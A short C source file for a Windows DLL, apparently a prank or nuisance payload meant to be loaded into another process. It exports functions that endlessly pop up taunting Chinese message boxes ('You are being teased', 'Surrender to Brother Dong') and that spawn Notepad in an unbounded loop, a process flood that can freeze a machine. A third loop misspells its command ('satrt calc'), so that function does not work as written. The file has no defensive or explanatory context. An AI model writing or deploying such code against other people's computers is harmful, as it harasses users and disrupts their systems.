#include<Windows.h>
#include<stdlib.h>
_declspec(dllexport) void go()
{
	while (1)
	{
		MessageBoxA(0, "请不要和东哥为敌", "你正在被调戏", 0);
		MessageBoxA(0, "向东哥认输吧", "你正在被调戏", 0);
		Sleep(1000);
	}
}

_declspec(dllexport) void main1()
{
	for (int i = 0; ; i++)
		system("start notepad");
}
_declspec(dllexport) void main2()
{
	for (int i = 0;;i++)
	{
		system("satrt calc");
	}
}